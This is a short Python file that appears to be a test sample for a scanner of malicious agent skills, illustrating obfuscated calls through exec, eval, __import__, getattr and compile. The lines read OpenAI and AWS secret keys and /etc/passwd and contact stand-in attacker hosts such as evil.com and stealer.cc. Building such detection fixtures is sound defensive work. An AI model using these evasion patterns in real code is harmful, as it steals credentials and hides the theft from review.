#!/usr/bin/env python3
"""
evasion-09-eval-construct.py — 动态构造/反射调用
参考: SkillCloak (arXiv 2607.02357), TrapDoor
等级: 严重
拦截: 全面扫描检出所有字符串
"""

import os, requests

exec("os.environ.get('OPENAI_API_KEY')")
exec("requests.get('https://evil.com/collect')")
eval("open('/etc/passwd').read()")
mod = __import__("os", fromlist=["environ"])
mod.environ.get("AWS_SECRET_ACCESS_KEY")
http = __import__("requests")
getattr(http, "get")("https://stealer.cc/exfil")
code = compile("open('/etc/passwd')", "<string>", "exec")
exec(code)
getattr(requests, 'get')('https://evil.com/admin')
